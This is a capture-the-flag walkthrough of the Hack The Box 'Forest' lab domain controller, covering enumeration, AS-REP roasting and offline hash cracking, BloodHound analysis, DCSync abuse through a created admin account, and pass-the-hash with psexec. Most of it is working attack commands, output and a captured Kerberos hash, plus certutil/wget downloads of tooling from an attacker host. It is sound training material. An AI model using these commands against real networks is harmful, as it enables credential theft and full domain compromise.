# Overview

## Recommended tools
- nmap: A network scanner installed by default on kali. Can be used to identify running service, gather information on hosts, fingerprint services, and much more.
- smbclient: A SMB enumeration tool installed by default on kali. SMBClient provides an FPT-like command line user interface used to enumerate, transfer, and exploit vulnerable windows & linux hosts. [Hacktricks docs on SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)
- crackmapexec: A swiss army knife for pentesting Windows/AD environments. Can perform domain enumeration, execute various AD related attacks, test for authenticated and unauthenticated access, and much more - [CME manual](https://wiki.porchetta.industries/)
- [impacket-library](https://github.com/fortra/impacket): A collection of python scripts used to enumerate & exploit networked services. 
- Hashcat: The foremost password cracking utility - should be installed on your host system (Ex. windows) for best performance. [Docs and download](https://hashcat.net/hashcat/)
- Evil-WinRM: A useful command line utility (requires credentials) that can be used to test the implementation of **Windows Remote Management** (Port 5985). Can be leveraged for code execution under the right conditions.

## OWASP Threats
- [A02:2021 – Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
- [A05:2021 – Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [A07:2021 – Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)

# Enumeration

## nmap
- Start with a basic nmap scan `nmap -p- -sV -sC $IP -T4 -oN basic_nmap`(snippet below)
```nmap
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON  VERSION
53/tcp    open  domain       syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2023-02-13 22:08:28Z)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack
593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack
3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack Microsoft Windows RPC
49681/tcp open  msrpc        syn-ack Microsoft Windows RPC
49698/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
```

- A windows server hosting **DNS, kerberos, ldap, SMB** is indicative of a Domain Controller
## CrackMapExec
- Since SMB was identified as a running service, check for anonymous login.
	- No luck.
```bash

┌──(kali㉿kali)-[~/Documents/htb/machines/forest]
└─$ crackmapexec smb $IP -u '' -p '' --shares
SMB         10.129.210.137  445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.210.137  445    FOREST           [+] htb.local\: 
SMB         10.129.210.137  445    FOREST           [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/machines/forest]
└─$ crackmapexec smb $IP -u '' -p '' --users 
SMB         10.129.210.137  445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.210.137  445    FOREST           [+] htb.local\: 
SMB         10.129.210.137  445    FOREST           [-] Error enumerating domain users using dc ip 10.129.210.137: NTLM needs domain\username and a password
SMB         10.129.210.137  445    FOREST           [*] Trying with SAMRPC protocol
SMB         10.129.210.137  445    FOREST           [+] Enumerated domain user(s)
SMB         10.129.210.137  445    FOREST           htb.local\Administrator                  Built-in account for administering the computer/domain
SMB         10.129.210.137  445    FOREST           htb.local\Guest                          Built-in account for guest access to the computer/domain
SMB         10.129.210.137  445    FOREST           htb.local\krbtgt                         Key Distribution Center Service Account
SMB         10.129.210.137  445    FOREST           htb.local\DefaultAccount                 A user account managed by the system.
SMB         10.129.210.137  445    FOREST           htb.local\$331000-VK4ADACQNUCA           
SMB         10.129.210.137  445    FOREST           htb.local\SM_2c8eef0a09b545acb           
SMB         10.129.210.137  445    FOREST           htb.local\SM_ca8c2ed5bdab4dc9b           
SMB         10.129.210.137  445    FOREST           htb.local\SM_75a538d3025e4db9a           
SMB         10.129.210.137  445    FOREST           htb.local\SM_681f53d4942840e18           
SMB         10.129.210.137  445    FOREST           htb.local\SM_1b41c9286325456bb           
SMB         10.129.210.137  445    FOREST           htb.local\SM_9b69f1b9d2cc45549           
SMB         10.129.210.137  445    FOREST           htb.local\SM_7c96b981967141ebb           
SMB         10.129.210.137  445    FOREST           htb.local\SM_c75ee099d0a64c91b           
SMB         10.129.210.137  445    FOREST           htb.local\SM_1ffab36a2f5f479cb           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailboxc3d7722           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailboxfc9daad           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailboxc0a90c9           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailbox670628e           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailbox968e74d           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailbox6ded678           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailbox83d6781           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailboxfd87238           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailboxb01ac64           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailbox7108a4e           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailbox0659cc1           
SMB         10.129.210.137  445    FOREST           htb.local\sebastien                      
SMB         10.129.210.137  445    FOREST           htb.local\lucinda                        
SMB         10.129.210.137  445    FOREST           htb.local\svc-alfresco                   
SMB         10.129.210.137  445    FOREST           htb.local\andy                           
SMB         10.129.210.137  445    FOREST           htb.local\mark                           
SMB         10.129.210.137  445    FOREST           htb.local\santi      
```

# GetNPUsers
- We have a feeling this is the DC for the `htb.local` domain, so lets see if there are any accounts that are susceptible to offline cracking.
	- [Hacktricks Docs](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
- the `GetNPUsers` impacket script checks for accounts that do not need Kerberos pre-authentication enabled
![](Pasted%20image%2020230213152443.png)
- Occasionally there will be useful data leaked in rpcdumps, check that just in case with `impacket-rpcdump`
## RPCDump (trash)
```bash
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Retrieving endpoint list from 10.129.210.137
Protocol: [MS-RSP]: Remote Shutdown Protocol 
Provider: wininit.exe 
UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0 
Bindings: 
          ncacn_ip_tcp:10.129.210.137[49664]
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\FOREST[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc071230]

Protocol: N/A 
Provider: winlogon.exe 
UUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0 
Bindings: 
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\FOREST[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc071230]
          ncalrpc:[WMsgKRpc073921]

Protocol: N/A 
Provider: N/A 
UUID    : D09BDEB5-6171-4A34-BFE2-06FA82652568 v1.0 
Bindings: 
          ncalrpc:[csebpub]
          ncalrpc:[LRPC-869cb06477bad80729]
          ncalrpc:[LRPC-17de353650058154d9]
          ncacn_np:\\FOREST[\pipe\LSM_API_service]
          ncalrpc:[LSMApi]
          ncalrpc:[LRPC-9579d48daf9e6299c0]
          ncalrpc:[actkernel]
          ncalrpc:[umpo]
          ncalrpc:[LRPC-17de353650058154d9]
          ncacn_np:\\FOREST[\pipe\LSM_API_service]
          ncalrpc:[LSMApi]
          ncalrpc:[LRPC-9579d48daf9e6299c0]
          ncalrpc:[actkernel]
          ncalrpc:[umpo]
          ncalrpc:[LRPC-b8fb5ad1a06f6bd4df]
          ncalrpc:[dhcpcsvc]
          ncalrpc:[dhcpcsvc6]
          ncacn_ip_tcp:10.129.210.137[49665]
          ncacn_np:\\FOREST[\pipe\eventlog]
          ncalrpc:[eventlog]
          ncalrpc:[LRPC-3b8bd5b89041fcfda1]

Protocol: N/A 
Provider: N/A 
UUID    : 697DCDA9-3BA9-4EB2-9247-E11F1901B0D2 v1.0 
Bindings: 
          ncalrpc:[LRPC-869cb06477bad80729]
          ncalrpc:[LRPC-17de353650058154d9]
          ncacn_np:\\FOREST[\pipe\LSM_API_service]
          ncalrpc:[LSMApi]
          ncalrpc:[LRPC-9579d48daf9e6299c0]
          ncalrpc:[actkernel]
          ncalrpc:[umpo]

Protocol: N/A 
Provider: sysntfy.dll 
UUID    : C9AC6DB5-82B7-4E55-AE8A-E464ED7B4277 v1.0 Impl friendly name
Bindings: 
          ncalrpc:[LRPC-9579d48daf9e6299c0]
          ncalrpc:[actkernel]
          ncalrpc:[umpo]
          ncalrpc:[senssvc]
          ncalrpc:[OLEA7B2222FF1CE635A037B53BB2BAA]
          ncalrpc:[IUserProfile2]
          ncalrpc:[IUserProfile2]
          ncalrpc:[IUserProfile2]
          ncalrpc:[OLEE4E3C72A0C60FF7CED9403703182]
          ncacn_ip_tcp:10.129.210.137[49667]
          ncalrpc:[samss lpc]
          ncalrpc:[SidKey Local End Point]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSA_EAS_ENDPOINT]
          ncalrpc:[lsacap]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncacn_np:\\FOREST[\pipe\lsass]
(SNIP)

```


# Foothold

- Earlier with `impacket-GetNPUsers` svc-alfresco was identified as not  needing pre-auth for kerberos - this means its vulnerable to asreproasting
	- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast

```bash
┌──(kali㉿kali)-[~/Documents/htb/machines/forest]
└─$ impacket-GetNPUsers htb.local/ -dc-ip $IP                                                    
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-02-13 17:30:24.349530  2019-09-23 07:09:47.931194  0x410200 



                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/machines/forest]
└─$ impacket-GetNPUsers htb.local/svc-alfresco -dc-ip $IP -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:ef2405d7be0b551ed384e5768b630e8b$666309a98238290f5622d5cdde91cb5e9630b2c26796f3e21f84560d926659538ef34b49e2680adeb73a203d827b437ac8aa70578c40510dfe247f15f7f3b2d55777018cfeedfbc191d39c03ad1c5ff049d2b666c2e892c15be612d92609e9bf3b48c39c2486e878575d3679b776532ff9ac88556cead3e437141e0d47a9e9a9071ee62b717369b8220d7826da2b13abc7ca3a32e3c870129bb16decb8d2e923db40c6dca02f90f44fe4b70fcbff976c5f462ca5f2efd85baaa805005c25db05ce3ec5c9a87d590601e14ea92d1a6f6fdaaf0758ff82c023a1e4fdac922fdccaff85aae8fa20

```
- with this hash, we can save it to a file and try to crack offline using hashcat
```bash
echo "$krb5asrep$23$svc-alfresco@HTB.LOCAL:02edf62c0a429041c31b90507b72b62b$a175de506e32f9ac50cc5972cca3e794d4417f6e5d16ddbb57cc068d98e3a7a12a4354af9086954ec3e3a3fa98e8a79487f9265459334e7f1c13909c3c40109cc0210997262409052a74ec7c6e42bc912325c0cd9e4fb449136469388532d8f2dd36389e09abab3bddc03641050d0022b5795eab057b4d2d615b54d300986e00bdb4f9747fcf664de615109f69877f38335ea16f77ac75bff14e634790fd7448d60c08f58abca2937767919b698460fbdf6c5376eea9ea49065c77561f18268e02e85d319617265d63c08ba3c010984c59a340c0ecd3884c4b63cdf25ea3e8e06b659c41290f" >> forest.hashes
```

### Cracking the Password Hash
- either copy the file or the hash to ur host, and crack it with hashcat - *significantly* faster on the host since it can utilize the GPU whereas the VM cant
- hashcat mode ![](Pasted%20image%2020230213152959.png)
	- https://hashcat.net/wiki/doku.php?id=example_hashes
- `./hashcat.exe -m 18200 -a 0 .\hashes\forest.hash .\rockyou.txt`
	- -m: Select the mode to be used when cracking - this is determined by the hash type
	- -a: The type of attack to use. 0 is a simple dictionary attack which then uses the supplied wordlist (rockyou.txt). [Attack modes](https://hashcat.net/wiki/#core_attack_modes)
- ![](Pasted%20image%2020230213153328.png)
- The password for `svc-alfresco` is `s3rvice`
	- **Good practice to blast creds out against the network using crackmapexec**
- ![](Pasted%20image%2020230213153858.png)
- ![](Pasted%20image%2020230213154012.png)

# Local privesc
- We now have a reliable connection to the host and can execute code - time to start local enumeration.
- run linpeas and look it over - nothing interesting....
	- move onto AD enumeration

### Active Directory Enumeration
- You will need to stand up [Bloodhound & neo4j](https://github.com/BloodHoundAD/BloodHound) to view active directory in a graph
	- `sudo /usr/bin/neo4j start ` and then `bloodhound` in terminal
- Bloodhound needs an **aggregator** to pull down the active directory layout of the victim - theres a [few ways](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound) to do this, but we'll use [SharpHound](https://github.com/BloodHoundAD/SharpHound)
	- On kali from a directory containing sharphound (preferably all your tools), run `python3 -m http.server 80`
	- On the victim (winrm shell) run `certutil -urlcache -split -f http://KALI_IP/SharpHound.exe`
		- You can pull `wget` to the victim since its easier to type (Ex. `wget KALI_IP/SharpHound.exe`)
	- ![](Pasted%20image%2020230213192611.png)
	- ![](Pasted%20image%2020230213192618.png)
- Running `SharpHound` will result in a `.zip` and `.bin` of which we only **really** need the `.zip`. Theres a few ways to move this like setting up a smb server on kali and transferring the file but this method would be fairly obviously abnormal behavior and stick out in system logs (not that we've been stealthy so far).
	- Instead we will b64 encode the file, `cat` it, and then copy paste it into a kali terminal to a file.
	- `certutil -encode "YOUR_BASE64_TEXT" | base64 -d > forest-ad.zip`
	- **Alternatively** to transfer over SMB....
		- On kali, standup a smb share with `impacket-smbserver shareName sharePath`
			- ![](Pasted%20image%2020230213194246.png)
		- On victim, connect to the share with `net use z: \\$IP\shareName`. Then you can navigate to `z:` or whatever you used, and copy files from windows to this directory. Files copied to here will be transferred to kali.
			- ![](Pasted%20image%2020230213194237.png)
### Navigating bloodhound graph
- Once we succesfully copy over the `.zip` of the AD domain, drag and drop the file into the bloodhound window opened earlier. Then in the search bar, search `svc-alfresco` and mark the user as owned since we have credentials.
- ![](Pasted%20image%2020230213194832.png)
- spooky
- ![](Pasted%20image%2020230213194848.png)
- What we're ultimately after in an AD environment are domain admin accounts. These accounts would give us unparalleled access across the domain. As such, start by searching for `Shortest Paths to Domain Admins from Owned Principals` under the analysis tab. This will generate a search starting with `svc-alfresco` and show the relations that could lead us to domain admin access.
- ![](Pasted%20image%2020230213195026.png)
- This graph shows `svc-alfresco` as a member of the `Service Accounts` group, which is a member of the `Privileged IT` group, which is a member of the `Account Operator` group and so on. The key issue here is that  Account Operators have [GenericAll](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) permissions over the `Exchange Windows Permissions` group, which in turn has `WriteDACL` permissions. These two misconfigurations will allow `svc-alfresco` to leverage full rights to the `Exchange Windows Permissions` group to modify and gain full control of an object through `WriteDACL`.
	- [Account Operator](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators) group also grants limited account creation capabilities
- The vector now is to leverage our GenericAll perms (granted by the Account Operator group) to modify the [AD  DACL](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists) using the WriteDACL perm granted by Exchange Windows Permissions group to give `svc-alfresco` [DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync) permissions

# Killchain
- Create the malicious admin user
- ![](Pasted%20image%2020230213200305.png)
- Add it to the Exchange Windows permissions group so it can modify the `htb.local` Domain DACL
- ![](Pasted%20image%2020230213200513.png)
- `$pass = convertto-securestring 'password' -AsPlainText -Force`
- `$cred = New-Object System.management.Automation.PSCredential('htb\pj_pentester', $pass)`
- `Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync`
- On kali, we will now use this new user to dump the user hashes of the domain with `secretsdump` from impacket
	- `impacket-secretsdump htb.local/pj_pentester:password@10.129.210.137`
	- ![](Pasted%20image%2020230213202849.png)
- Most important from the dump is the `htb.local\Administrator` - this is a domain scoped admin account.
	- ![](Pasted%20image%2020230213202932.png)
- We can now run a [pass the hash](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying) using `crackmapexec` - we confirm that this works by testing smb
- ![](Pasted%20image%2020230213203106.png)
	- With this, we can now get access with these creds through psexec
		- **Hint:** Use all 0s ahead of the hash - TODO: explain
	- ![](Pasted%20image%2020230213203428.png)
	- Domain owned
- #### Example - metasploit modules
- Instead of using an impacket script to connect to the box, its possible to use metasploit to perform the same task.
- Steps:
	- Launch with `msfconsole`
	- `search psexec`
	- ![](Pasted%20image%2020230213203654.png)
	- `use 4`
	- `show options` will display all of the required values that need to be set for a particular exploit
	- ![](Pasted%20image%2020230213204200.png)
	- ![](Pasted%20image%2020230213204113.png)
	- ![](Pasted%20image%2020230213204242.png)